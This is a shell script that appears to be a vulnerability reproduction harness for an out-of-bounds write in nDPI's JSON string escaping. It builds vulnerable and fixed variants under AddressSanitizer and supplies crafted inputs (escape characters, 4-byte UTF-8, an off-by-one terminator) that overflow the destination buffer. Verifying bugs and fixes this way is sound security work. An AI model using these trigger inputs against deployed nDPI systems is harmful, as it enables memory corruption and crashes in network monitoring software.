#!/bin/sh
# nDPI2shell direct-call harness (CVE-2026-86098 / GHSA-c8vx-3h2j-4f8m).
# Verbatim slices of the raw pinned ndpi_serializer.c (94e82c1^ vulnerable,
# 94e82c1 fixed) are extracted into pins/ and included under #line control.
# Everything else (u_char stub, buffers, driver) is declared lab code.
# No nDPI build, no lib, no socket, no wire, no packet capture.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
ROOT=$(CDPATH= cd -- "$HERE/.." && pwd)
PINS="$ROOT/pins"
SRC="$ROOT/src"
mkdir -p "$PINS" "$HERE/evidence"

# Verbatim slices, byte-for-byte from the pinned raw files.
sed -n '90,166p' "$SRC/ndpi_serializer.c.vuln"  > "$PINS/ndpi_serializer.c.vuln.slice"
sed -n '90,226p' "$SRC/ndpi_serializer.c.fixed" > "$PINS/ndpi_serializer.c.fixed.slice"
(cd "$ROOT" && sha256sum -c PINS.sha256 >/dev/null)

gen_driver() { # variant vuln|fixed
    v=$1
    if [ "$v" = vuln ]; then tag=ndpi_serializer.c.vuln
    else                    tag=ndpi_serializer.c.fixed
    fi
    out="$HERE/driver-$v.c"
    {
        cat <<'HEADER'

/* Generated by harness/run.sh. Pinned upstream bytes are under #line;
   everything else is declared stub/driver code. Do not edit by hand. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Declared stub: nDPI's u_char is an unsigned char typedef. */
typedef unsigned char u_char;

HEADER
        printf '\n#line 90 "%s"\n' "$tag"
        cat "$PINS/$tag.slice"
        cat <<'TAIL'

/* #line reset: only the pinned slice above is upstream bytes. */
#line 1 "driver-tail.c"

/* Declared driver state. dst_max_len is the exact caller buffer size. */
static int g_dst_max_len = 8;
static unsigned char g_src[64];
static int g_src_len = 0;

static void init_scenario(const char *sc) {
    memset(g_src, 0, sizeof g_src);
    if (!strcmp(sc, "baseline")) {
        memcpy(g_src, "abc", 3); g_src_len = 3; g_dst_max_len = 32;
    } else if (!strcmp(sc, "escape")) {
        /* 6 printable + '/' => 2-byte escape begins at j=dst_max_len-1. */
        memcpy(g_src, "AAAAAA/", 7); g_src_len = 7; g_dst_max_len = 8;
    } else if (!strcmp(sc, "utf8")) {
        /* 4 printable + 4-byte UTF-8 => 4 writes begin at j=5 of 8. */
        memcpy(g_src, "AAAA\xf0\x9f\x98\x80", 8); g_src_len = 8; g_dst_max_len = 8;
    } else if (!strcmp(sc, "nul")) {
        /* 6 printable => closing quote at dst[7], off-by-one NUL at dst[8]. */
        memcpy(g_src, "AAAAAA", 6); g_src_len = 6; g_dst_max_len = 8;
    } else {
        fprintf(stderr, "unknown scenario %s\n", sc);
        exit(2);
    }
}

int main(int argc, char **argv) {
    const char *sc = argc > 1 ? argv[1] : "baseline";
    init_scenario(sc);

    /* ASan: exact-size allocation so the first OOB write faults.
       Plain: trailing canary so chosen bytes can be read after the call. */
    size_t alloc = (size_t)g_dst_max_len;
#ifndef ASAN_BUILD
    alloc += 32;
#endif
    char *dst = (char *)malloc(alloc);
    if (!dst) return 2;
#ifndef ASAN_BUILD
    memset(dst + g_dst_max_len, 0xa5, 32);
#endif

    int rc = ndpi_json_string_escape((const char *)g_src, g_src_len,
                                     dst, g_dst_max_len);

    printf("scenario=%s variant=%s dst_max_len=%d rc=%d\n", sc,
#if VULN_BUILD
        "vuln",
#else
        "fixed",
#endif
        g_dst_max_len, rc);
#ifndef ASAN_BUILD
    unsigned char *tail = (unsigned char *)dst + g_dst_max_len;
    printf("tail=%02x %02x %02x %02x %02x %02x %02x %02x\n",
        tail[0], tail[1], tail[2], tail[3],
        tail[4], tail[5], tail[6], tail[7]);
#endif
    free(dst);
    return 0;
}
TAIL
    } > "$out"
}

gen_driver vuln
gen_driver fixed

build() { # cc variant mode
    cc=$1; v=$2; mode=$3
    defs="-DVULN_BUILD=$([ "$v" = vuln ] && echo 1 || echo 0)"
    if [ "$mode" = asan ]; then
        defs="$defs -DASAN_BUILD=1 -fsanitize=address"
    fi
    # shellcheck disable=SC2086
    "$cc" -O0 -g -fno-omit-frame-pointer -std=gnu11 $defs \
        "$HERE/driver-$v.c" -o "$HERE/$cc-$v-$mode"
}

for cc in gcc clang; do
    for v in vuln fixed; do
        for mode in plain asan; do
            build "$cc" "$v" "$mode"
        done
    done
done
printf 'built 8 binaries in %s\n' "$HERE"
